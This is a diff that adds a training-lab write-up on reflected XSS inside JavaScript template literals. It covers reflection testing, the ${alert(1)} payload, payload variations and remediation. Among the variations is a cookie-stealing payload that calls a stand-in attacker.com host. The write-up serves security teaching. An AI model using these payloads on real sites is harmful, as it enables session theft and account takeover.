@@ -9122,3 +9122,378 @@ Click triggers execution
 Bypass filters using **HTML encoding** to break JavaScript inside attributes  
 
 ---
+
+---
+
+# 🐞Lab-23 Reflected XSS — JavaScript Template Literals (Backticks Context)
+
+---
+
+## 🔹 Overview
+
+Reflected Cross-Site Scripting (Reflected XSS) occurs when:
+
+✔ User input is sent to the server  
+✔ Immediately reflected in the response  
+✔ Browser interprets it as executable JavaScript  
+
+---
+
+👉 In this lab:
+
+Input is reflected inside:
+
+JavaScript → template literal (` `)
+
+---
+
+👉 Special behavior:
+
+❌ `< > ' "` → HTML encoded  
+❌ ` (backtick) → escaped  
+✔ `${...}` → allowed  
+
+---
+
+## 🧠 What Is This Topic?
+
+XSS inside **JavaScript template literals**
+
+---
+
+## 🔹 Context Structure
+
+```
+var searchTerms = `USER_INPUT`;
+```
+
+---
+
+👉 Input is inside:
+
+Template literal → `` `INPUT` ``  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### 1️⃣ Initial Test (Reflection Check)
+
+Input:
+
+```
+test123
+```
+
+---
+
+### 2️⃣ Observe Response
+
+```
+var searchTerms = `test123`;
+```
+
+---
+
+✔ Confirmed:
+
+Inside template literal context  
+
+---
+
+## 📸 Screenshot — Reflection in Template Literal
+
+![reflection-backtick](../images/js-template-reflection-payload.png)
+
+---
+
+### 3️⃣ Try Normal Payloads (Fail)
+
+```
+<script>alert(1)</script>
+```
+
+❌ Encoded  
+
+---
+
+```
+';alert(1);
+```
+
+❌ No effect  
+
+---
+
+### 4️⃣ Use Correct Payload
+
+```
+${alert(1)}
+```
+
+---
+
+### 5️⃣ Send Payload
+
+```
+${alert(1)}
+```
+
+---
+
+### 6️⃣ Server Response
+
+```
+var searchTerms = `${alert(1)}`;
+```
+
+---
+
+### 7️⃣ Execution
+
+Browser evaluates:
+
+```
+${...}
+```
+
+→ Executes JavaScript  
+
+---
+
+💥 Result:
+
+```
+alert(1)
+```
+
+✅ Lab Solved  
+
+---
+
+## 📸 Screenshot — Final Payload Execution
+
+![template-payload](../images/js-template-final-payload.png)
+
+---
+
+## 🔍 Payload Breakdown
+
+---
+
+### 🔴 Final Payload
+
+```
+${alert(1)}
+```
+
+---
+
+### 🟢 Step-by-Step
+
+---
+
+#### 🔹 1️⃣ ${
+
+Start of JS expression  
+
+---
+
+#### 🔹 2️⃣ alert(1)
+
+Executes JavaScript  
+
+---
+
+#### 🔹 3️⃣ }
+
+Ends expression  
+
+---
+
+## 🧠 Final Code
+
+```
+var searchTerms = `${alert(1)}`;
+```
+
+---
+
+💥 Executes immediately  
+
+---
+
+## 🔹 Why No Breaking Needed
+
+---
+
+Because template literals already allow execution  
+
+---
+
+👉 Comparison:
+
+```
+'string'   → need breaking  
+`string`   → direct execution via ${}
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Modern Frontend Apps
+
+```
+const msg = `Hello ${userInput}`;
+```
+
+---
+
+### 🟢 API Rendering
+
+```
+element.innerHTML = `Result: ${query}`;
+```
+
+---
+
+### 🟢 Logging Systems
+
+```
+console.log(`Search: ${input}`);
+```
+
+---
+
+### 🟢 Notifications
+
+```
+showMsg(`User ${input} logged in`);
+```
+
+---
+
+### 🟢 Dynamic HTML
+
+```
+container.innerHTML = `<div>${input}</div>`;
+```
+
+---
+
+### 🟢 Search Features
+
+```
+var searchTerms = `USER_INPUT`;
+```
+
+---
+
+## 🔥 Payload Variations
+
+---
+
+```
+${alert(1)}
+```
+
+---
+
+```
+${alert(document.domain)}
+```
+
+---
+
+```
+${console.log(1)}
+```
+
+---
+
+```
+${fetch('https://attacker.com?c='+document.cookie)}
+```
+
+---
+
+```
+${eval('alert(1)')}
+```
+
+---
+
+```
+${(()=>alert(1))()}
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+🔥 Account takeover  
+
+🔥 Token theft  
+
+🔥 Admin compromise  
+
+🔥 API abuse  
+
+🔥 DOM manipulation  
+
+---
+
+## 🛡️ Remediation
+
+---
+
+✔ Avoid inserting input in template literals  
+✔ Use `textContent` instead of HTML  
+✔ Escape output properly  
+✔ Use secure frameworks  
+✔ Apply CSP  
+
+---
+
+## 🧠 Pro Hunter Mindset
+
+---
+
+👉 If you see backticks → think `${...}`  
+
+---
+
+✔ No breaking needed  
+✔ Direct execution possible  
+✔ Common in modern apps  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+---
+
+Input  
+↓  
+Reflected inside `` ` ``
+↓  
+`${...}` executes  
+↓  
+Immediate execution  
+
+---
+
+## 🎯 Final One-Liner
+
+---
+
+Template literal XSS = inject `${payload}` → instant execution  
+
+---
